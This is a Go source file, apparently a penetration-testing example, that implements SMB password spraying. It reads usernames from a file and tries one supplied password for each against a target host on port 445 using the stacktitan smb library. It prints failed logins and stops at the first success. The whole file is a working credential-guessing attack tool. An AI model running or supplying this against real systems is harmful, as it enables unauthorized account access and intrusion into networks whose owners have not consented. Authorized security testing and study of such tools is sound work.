package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	"github.com/stacktitan/smb/smb"
)

func main() {
	// ...
	if len(os.Args) != 5 {
		log.Fatalln("Usage: go run main <user/file> <password> <domain> <target_host>")
	}

	buf, err := ioutil.ReadFile(os.Args[1])
	if err != nil {
		log.Fatalln(err)
	}
	options := smb.Options{
		Password: os.Args[2],
		Domain:   os.Args[3],
		Host:     os.Args[4],
		Port:     445,
	}
	users := bytes.Split(buf, []byte("\n"))

	for _, user := range users {
		options.User = string(user)
		session, err := smb.NewSession(options, false)
		if err != nil {
			fmt.Println("[-] Login failed for user", options.User)
			continue
		}
		defer session.Close()
		if session.IsAuthenticated {
			fmt.Println("[+] Login successful for user", options.User, options.Password)
			break
		}
	}

}
